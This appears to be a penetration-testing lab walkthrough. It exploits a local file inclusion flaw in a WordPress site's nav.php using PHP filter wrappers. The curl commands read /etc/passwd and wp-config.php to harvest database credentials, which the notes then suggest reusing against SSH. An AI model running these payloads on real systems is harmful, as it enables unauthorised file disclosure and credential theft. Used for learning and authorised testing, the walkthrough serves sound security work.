## 🔍 Discovery and Enumeration

The default Apache page is present on the web root. Loading the WordPress index page confirms the application is installed in the web root directory. WordPress stores database configurations in the `wp-config.php` file.

```bash
# Verify WordPress installation in the web root via LFI
curl -s http://172.16.1.10/nav.php?page=/var/www/html/wordpress/index.php
```
* Tool: cURL

## ⚙️ PHP Wrapper Exploitation

PHP provides wrappers for accessing files, protocols, or streams. The `php://` wrapper is enabled by default and interacts with IO streams (e.g., `php://stdin`, `php://stdout`, `php://input`, `php://output`). 

The `php://filter` wrapper is highly effective for Local File Inclusion (LFI) because it can be chained with multiple filters. Using filters like base64 or ROT13 prevents the PHP engine from executing the target file, allowing the raw source code to be read.

```bash
# Extract /etc/passwd using base64 encoding filter
curl -s http://172.16.1.10/nav.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd
```
* Tool: cURL / PHP Filter

```bash
# Extract /etc/passwd using ROT13 encoding filter
curl -s http://172.16.1.10/nav.php?page=php://filter/read=string.rot13/resource=/etc/passwd
```
* Tool: cURL / PHP Filter

## 🔑 Credential Extraction

Apply the base64 encoding filter to the LFI payload to safely extract the `wp-config.php` file. The output must be decoded and saved locally for inspection.

```bash
# Fetch wp-config.php via LFI, base64 decode the stream, and output to a local file
curl -s http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php | base64 -d > wpconfig.php
```
* Tool: cURL / base64

Inspection of the downloaded `wpconfig.php` file reveals database credentials. Proceed to test these extracted credentials against the target's SSH service for potential reuse.
